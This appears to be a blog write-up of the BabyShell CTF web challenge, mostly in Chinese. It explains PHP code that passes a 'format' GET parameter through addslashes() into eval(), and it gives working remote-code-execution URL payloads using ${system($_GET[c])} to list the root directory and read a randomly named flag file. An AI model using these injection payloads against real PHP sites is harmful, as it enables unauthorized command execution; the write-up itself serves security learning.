---
date: '2025-06-29T22:06:02+08:00'
draft: false
title: 'CTF_babyshell'
tags: [ "CTF", "web", "Docker"]
---
# BabyShell

這次的題目是由[Chw41](https://github.com/Chw41)出題，[題目來源](https://github.com/Chw41/Individual-CTF-Topic/tree/main/BabyShell)
## Description

BabyShell is a Capture The Flag (CTF) challenge designed to test your skills in exploiting a simple web shell technique. The challenge involves leveraging the getTime() function to retrieve the current time, which is crucial for solving the puzzle.

<!--more-->

題目環境架構:
```
├── challenge
│ ├── assets
│ │ ├── cyberpunk.gif
│ │ └── favicon.png
│ ├── controllers
│ │ └── TimeControllers.php
│ ├── models
│ │ └── TimeModel.php
│ ├── static
│ │ ├── css
│ │ ├── js
│ │ └── fr0g.gif
│ ├── views
│ │ └── index.php
│ ├── index.php
│ └── Router.php
├── config/
├── Dockerfile
├── build_docker.sh
├── docker-compose
├── entrypoint.sh
└── flag
```

## Solution
1. 建立容器: `docker build -t babyshell .`
2. 啟動容器: `docker run --name=babyshell --rm -p1337:80 -it babyshell`
3. 連線到port1337，打開網站，頂部顯示時間:2025-06-29 20:28:26，頁面顯示: 2025-06-29T20:28:26+00:00080
4. 觀察source code

<details open> <summary>Dockerfile 程式碼</summary>

```php =
FROM ubuntu:20.04

# Ubuntu Mirror TW
RUN sed 's@archive.ubuntu.com@free.nchc.org.tw@' -i /etc/apt/sources.list

# Setup user
RUN useradd www

# Install system packeges
RUN apt-get update && apt-get install -y supervisor nginx lsb-release wget software-properties-common

# Add repos
RUN add-apt-repository ppa:ondrej/php
RUN apt-get update

# Install PHP dependencies
RUN apt update && apt install php7.4-fpm -y

# Configure php-fpm and nginx
COPY config/fpm.conf /etc/php/7.4/fpm/php-fpm.conf
COPY config/supervisord.conf /etc/supervisord.conf
COPY config/nginx.conf /etc/nginx/nginx.conf

# Copy challenge files
COPY challenge /www

# Copy flag
COPY flag /

# Setup permissions
RUN chown -R www:www /www /var/lib/nginx

# Expose the port nginx is listening on
EXPOSE 80

# Generate random flag filename and start supervisord
COPY --chown=root entrypoint.sh /entrypoint.sh
ENTRYPOINT ["/entrypoint.sh"]

CMD ["/usr/bin/supervisord", "-c", "/etc/supervisord.conf"]
```
</details>

<div class="warning-box">
<strong>
程式解讀:
28行: COPY flag / -> Flag 不在網站目錄 /www 下，而是在容器的根目錄 /
</strong>
</div>
 
<details open> <summary>entrypoint.sh 程式碼</summary>

```sh =
#!/bin/bash

# Secure entrypoint
chmod 600 /entrypoint.sh

FLAG=$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 5 | head -n 1)

mv /flag /flag$FLAG

exec "$@"
```
</details>

<div class="warning-box">
<strong>
代表 flag 的檔名會隨機生成一個長度為5個字元的隨機字串，並將原本的 /flag 檔案重新命名為 /flag<隨機字串>
</strong>
</div>


<details open> <summary>TimeModel.php 程式碼</summary>

```php =
<?php
class TimeModel
{
    public function __construct($format)
    {
        $this->format = addslashes($format);
        $offset_seconds = 8 * 3600;

        $current_utc_time = gmdate('Y-m-d H:i:s');
        $prediction_time = date('Y-m-d H:i:s', strtotime($current_utc_time) + $offset_seconds);

        $this->prediction = $prediction_time;
    }

    public function getTime()
    {
        eval('$time = date("' . $this->format . '", strtotime("' . $this->prediction . '"));');
        return isset($time) ? $time : 'Something went terribly wrong';
    }
}

// Example usage:
$format = 'Y-m-d H:i:s';
$model = new TimeModel($format);
echo $model->getTime(); // Output: Predicted time formatted according to $format
?>
```
</details>

<div class="danger-box">
<strong>
addslashes是一個函式，回傳在合格字元之前添加反斜線( \ )的字串，合格字元包括( ' 或是 " 或是 \ )
舉例輸入 :
system('cat flag') 會解讀成: system(\'cat flag\')
</strong>
</div>

<div class="info-box">
<strong>
example:

code :
```php
<?php
$str = "Who's Peter Griffin?";
echo $str . " This is not safe in a database query.<br>";
echo addslashes($str) . " This is safe in a database query.";
?> 
```
output :
```text:
Who's Peter Griffin? This is not safe in a database query.
Who\'s Peter Griffin? This is safe in a database query.
```
</strong>
</div>

參考來源: [addslashes_fun](https://www.runoob.com/php/func-string-addslashes.html)

<div></div>

<details open> <summary>TimeController.php 程式碼</summary>

```php =
<?php
class TimeController
{
    public function index($router)
    {
        $format = isset($_GET['format']) ? $_GET['format'] : 'chw';
        $time = new TimeModel($format);
        return $router->view('index', ['time' => $time->getTime()]);
    }
}
```
</details>

第6~8行代表:
- 可以透過 GET 參數 `format`傳入字串
- format 會傳進 `TimeModel` -> 執行 `eval()` -> RCE

<div class="warning-box">
<strong>確認漏洞: RCE</strong> 
</div>

5. 測試payload 
    1. 要先測試 RCE 能夠成功
`http://localhost:1337/?format=Y-m-d";system($_GET[c]);//&c=id`
            - `date("Y-m-d")` 是正常的時間格式
            - `";system(...)` 關閉前面字串，插入PHP 函數
            - `//` 註解

    程式執行:

    `eval('$time = date("Y-m-d";system($_GET[c]);// ...`
    
    頂部輸出 :

    `2025-06-29 20:29:15`

    頁面輸出 : 

    `2025-06-29";15251530UTC06(2929);//`

    <div class = "fail">
        RCE 失敗
    </div>

    ![image](https://hackmd.io/_uploads/ry-lMnA4ee.png)

    2. 失敗原因思考
    - format 傳入 "Y-m-d";system($_GET[c]);//
    - addslashes() 會將 (" 或 ' 或 \ ) 轉義為 ( \ " 或 \ '  或\ \ ) ->  變成 `Y-m-d\";system($_GET[c]);\/\/`
    - eval 語法錯誤
    **需要繞過限制**
    
    3. 更改payload 

        輸入 :

        `http://localhost:1337/?format=${system($_GET[c])}//&c=id`

        程式執行:
        `eval('$time = date("${system($_GET[c])}", strtotime(...));');`
        - **在雙引號字串中使用 ${} 可以強制變數或函數的插值**
        頂端輸出 : 
        `2025-06-29 20:30:08uid=1000(www) gid=1000(www) groups=1000(www)`
        ![image](https://hackmd.io/_uploads/SkxGGnRNee.png)


            ->有點東西
    
    4. 但因為前面有說 `/flag` 會變成隨機字串，要先找出檔案名稱
    輸入 : 

        `http://localhost:1337/?format=${system($_GET[c])}//&c=ls /`

        頂端輸出 :
        
        `2025-06-29 20:31:13bin boot dev entrypoint.sh etc flagV0JLH home lib lib32 lib64 libx32 media mnt opt proc root run sbin srv sys tmp usr var www`

        喔喔喔，`flagV0JLH` 抓到你了
![image](https://hackmd.io/_uploads/BJOQfnREel.png)

    
    5. 最後一步 

        輸入 :

        `http://localhost:1337/?format=${system($_GET[c])}//&c=cat /flagV0JLH`

        輸出 :

        `2025-06-29 20:32:03CHW{7hi5_1s_f4k3_fl4g}`

       ![image](https://hackmd.io/_uploads/Sy3UzhA4lg.png)


## Flag
<div class="flag-box">
<strong>
flag : CHW{7hi5_1s_f4k3_fl4g}
</strong>
</div>